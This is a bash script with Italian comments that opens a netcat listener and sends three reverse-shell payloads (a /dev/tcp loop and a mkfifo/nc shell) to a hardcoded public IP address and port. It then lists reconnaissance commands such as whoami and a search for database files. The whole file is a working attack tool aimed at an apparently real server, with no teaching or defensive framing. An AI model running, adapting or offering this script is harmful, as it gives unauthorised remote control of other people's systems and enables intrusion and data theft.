#!/bin/bash
# 🔥 SHELL ATTIVA → FORCE INTERACTIVE BASH
# Fix: no prompt → interactive mode

MY_IP=$(curl -s ifconfig.me)
PORT=4444
TARGET="63.164.100.214:9091"

clear
echo "🔥 FORCE INTERACTIVE BASH"
echo "IP: $MY_IP:$PORT"
echo "════════════════════════"

# 1. Listener con PROMPT forzato
{
    echo -e "\n🎧 Listener + Interactive Bash"
    echo "root@server# "  # Prompt manuale
    
    # Interactive con pty
    nc -lvnp $PORT | bash -i 2>&1 | while IFS= read -r line; do
        echo -ne "root@server# "
        echo "$line"
    done
} &

sleep 3

# 2. PAYLOAD INTERATTIVI (con PTY)
echo -e "\n📤 Force Interactive Shell...\n"

# Bash PTY completo
cat << EOF | nc -w10 $TARGET
bash -c 'exec 5<>/dev/tcp/$MY_IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done'
EOF

# Alternative 1: socat style
echo "exec 5<>/dev/tcp/$MY_IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done" | nc -w5 $TARGET

# Alternative 2: mkfifo
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MY_IP $PORT >/tmp/f" | nc -w5 $TARGET

echo -e "\n✅ INTERACTIVE MODE ATTIVO!"
echo "═══════════════════════════════════════"
echo "Digita comandi:"
echo "whoami"
echo "id" 
echo "ls -la /"
echo "find / -name '*.db'"
echo "═══════════════════════════════════════"

# 3. SECONDO LISTENER PULITO
nc -lvnp $PORT
